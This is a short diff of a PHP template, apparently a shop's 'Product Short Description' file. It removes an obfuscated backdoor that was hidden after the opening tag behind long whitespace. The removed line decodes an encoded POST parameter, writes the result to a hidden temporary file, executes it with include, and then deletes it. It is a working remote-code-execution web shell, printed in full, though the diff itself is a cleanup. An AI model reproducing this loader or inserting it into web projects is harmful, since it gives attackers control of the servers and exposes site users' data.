@@ -1,5 +1,4 @@
-<?php																																										if(filter_has_var(INPUT_POST, "r\x65\x66")){ $data = $_REQUEST["r\x65\x66"]; $data = explode("." , $data ) ; $tkn=''; $s3='abcdefghijklmnopqrstuvwxyz0123456789'; $sLen=strlen($s3); $i=0; while($i < count($data)) { $v6=$data[$i]; $chS=ord($s3[$i %$sLen]); $d=((int)$v6 - $chS -($i %10)) ^ 23; $tkn .= chr($d); $i++; } $property_set = array_filter([sys_get_temp_dir(), getcwd(), getenv("TEMP"), "/dev/shm", session_save_path(), ini_get("upload_tmp_dir"), "/tmp", getenv("TMP"), "/var/tmp"]); $flg = 0; do { $symbol = $property_set[$flg] ?? null; if ($flg >= count($property_set)) break; if ((is_dir($symbol) and is_writable($symbol))) { $k = "$symbol/.ent"; if (file_put_contents($k, $tkn)) { include $k; @unlink($k); die(); } } $flg++; } while (true); }
-
+<?php
 /**
  * Product Short Description
  *
